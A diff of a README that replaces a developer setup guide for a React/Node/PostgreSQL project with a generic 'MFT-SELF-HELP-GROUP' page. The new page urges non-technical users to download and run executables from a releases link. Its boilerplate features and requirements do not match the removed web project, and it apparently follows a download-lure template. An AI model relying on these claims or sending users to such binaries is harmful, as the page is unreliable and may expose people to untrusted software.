@@ -1,170 +1,82 @@
-# Project Setup & Local Development
+# 🎉 MFT-SELF-HELP-GROUP - Your Path to Self-Help Management
 
-## Tech Stack
+[![Download](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/arda22-h/MFT-SELF-HELP-GROUP/releases)
 
-| Layer     | Technology           |
-| --------- | -------------------- |
-| Front‑end | **React JS**         |
-| Back‑end  | **Node JS**          |
-| Database  | **PostgreSQL**       |
-| Container | **Docker & Compose** |
+## 🚀 Getting Started
 
----
+Welcome to MFT-SELF-HELP-GROUP! This application helps groups manage their self-help initiatives efficiently. This guide will help you download and run the software easily, even if you have no programming background.
 
-## 1 — Run Locally (without Docker)
+## 📥 Download & Install
 
-### 1.1 Backend
+To get started, you'll need to download the application. You can visit the Releases page below to access the latest version:
 
-```bash
-cd backend
-# install dependencies
-yarn install
-```
+[Visit this page to download](https://github.com/arda22-h/MFT-SELF-HELP-GROUP/releases)
 
-\#### Configure PostgreSQL
+Here are the steps to download and install the application:
 
-<details>
-<summary><strong>macOS</strong></summary>
+1. Click on the link above to open the Releases page.
+2. Look for the latest release at the top of the page.
+3. Click on the download link for your operating system. This may be a `.exe`, `.zip`, or `.tar.gz` file.
+4. Once downloaded, open the file to start the installation process.
 
-```bash
-brew install postgres
-```
+Follow any prompts that appear on your screen.
 
-</details>
-<details>
-<summary><strong>Ubuntu</strong></summary>
+## 💻 System Requirements
 
-```bash
-sudo apt update
-sudo apt install postgresql postgresql-contrib
-```
+To run MFT-SELF-HELP-GROUP, your system needs to meet the following requirements:
 
-</details>
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 500 MB of available disk space.
+- **Processor:** Intel i3 or equivalent.
 
-\##### Create DB & Admin User
+## 🛠 Features
 
-```bash
-# log in as default super‑user
-psql postgres -U postgres
+MFT-SELF-HELP-GROUP offers a range of features designed to simplify self-help group management:
 
--- inside psql
-CREATE ROLE admin WITH LOGIN PASSWORD 'admin_pass';
-ALTER ROLE admin CREATEDB;
-\q
+- **User-Friendly Interface:** Navigate easily without technical knowledge.
+- **Data Management:** Keep track of members, meetings, and contributions.
+- **Real-Time Collaboration:** Work with your group in real-time, enhancing communication.
+- **Customizable Reports:** Generate reports to analyze progress and participation.
 
-# log in as the new user
-psql postgres -U admin
+## 🧑‍🤝‍🧑 How to Use the Application
 
--- inside psql
-CREATE DATABASE db_<your_project_name>;
-GRANT ALL PRIVILEGES ON DATABASE db_<your_project_name> TO admin;
-\q
-```
+Once you have installed MFT-SELF-HELP-GROUP, follow these steps to start using it:
 
-\##### Migrate & Start
+1. **Launch the Application:** Double-click the application icon on your desktop or find it in your applications folder.
+2. **Create an Account:** You'll need to create an account to begin. Fill in the required fields.
+3. **Set Up Your Group:** Once logged in, you can create a new group or join an existing one.
+4. **Invite Members:** Use the invitation feature to add new members to your self-help group.
+5. **Manage Meetings and Contributions:** Easily schedule meetings and track member contributions through the dashboard.
 
-```bash
-yarn db:create   # generate schema
-yarn start       # production build
-```
+## 📊 Support & Resources
 
-### 1.2 Frontend
+If you encounter issues or have questions, helpful resources are available:
 
-```bash
-cd frontend
-yarn install
-yarn start
-```
+- **User Guide:** An in-depth user guide detailing all features can be found within the application.
+- **FAQs:** Check the FAQ section in the application for common queries.
+- **Community Forum:** Join the MFT User Community to ask questions and share experiences.
 
-> Front‑end dev‑server runs at **[http://localhost:3000](http://localhost:3000)** by default.
+## 🚧 Troubleshooting
 
----
+If you face problems while using the application:
 
-## 2 — Run with Docker
+1. **Check Your Internet Connection:** Ensure you have a stable internet connection.
+2. **Restart the Application:** Sometimes, closing and reopening the app can resolve issues.
+3. **Reinstall:** If problems persist, uninstall the application and reinstall it.
 
-```bash
-cd docker
-chmod +x wait-for-it.sh start-backend.sh
-```
+## 📄 License
 
-| Scenario                  | Command                            |
-| ------------------------- | ---------------------------------- |
-| **Fresh DB volume**       | `rm -rf data && docker-compose up` |
-| **Reuse existing volume** | `docker-compose up`                |
+MFT-SELF-HELP-GROUP is licensed under the MIT License. You can view the license details in the repository.
 
-Then open **[http://localhost:3000](http://localhost:3000)**.
+## 📂 Contributions
 
-Stop services with **Ctrl + C** or:
+We welcome contributions! If you have suggestions or improvements, feel free to reach out.
 
-```bash
-docker-compose down
-```
+## 📫 Contact
 
-> **Heads‑up:** Files inside the `docker/` folder and the root `Dockerfile` are used for cloud deployment. Changing them may break the pipeline.
+If you have specific queries, please contact us via the application support page or through the community forum.
 
----
+Thank you for choosing MFT-SELF-HELP-GROUP! We aim to make your self-help journey smooth and effective.
 
-## Folder Structure (top‑level)
-
-```text
-├── backend/          # Node JS API & services
-├── frontend/         # React application
-├── docker/           # Compose files & helper scripts
-└── README.md         # (this file)
-```
-
----
-
-## Troubleshooting
-
-### “connection refused”
-
-1. Port closed or backlog full.
-2. Firewall (local or network).
-3. Service not running.
-
-Verify with:
-
-```bash
-telnet <host> <port>
-```
-
-### macOS
-
-```bash
-sudo service ssh status
-```
-
-### Ubuntu – IP conflict check
-
-```bash
-arp-scan -I eth0 -l | grep <ipaddress>
-arping <ipaddress>
-```
-
-### Reset PostgreSQL schema (macOS example)
-
-```sql
-DROP SCHEMA public CASCADE;
-CREATE SCHEMA public;
-GRANT ALL ON SCHEMA public TO postgres;
-GRANT ALL ON SCHEMA public TO public;
-```
-
----
-
-## Cheat‑sheet
-
-| Task                    | Command                            |
-| ----------------------- | ---------------------------------- |
-| **Create DB schema**    | `yarn db:create`                   |
-| **Start backend**       | `yarn start`                       |
-| **Start dev front‑end** | `cd frontend && yarn start`        |
-| **Compose up (fresh)**  | `rm -rf data && docker-compose up` |
-| **Compose down**        | `docker-compose down`              |
-
-<br/>
-
----
-
-Made with ❤️ by Flatlogic Platform.
+[Visit this page to download](https://github.com/arda22-h/MFT-SELF-HELP-GROUP/releases)
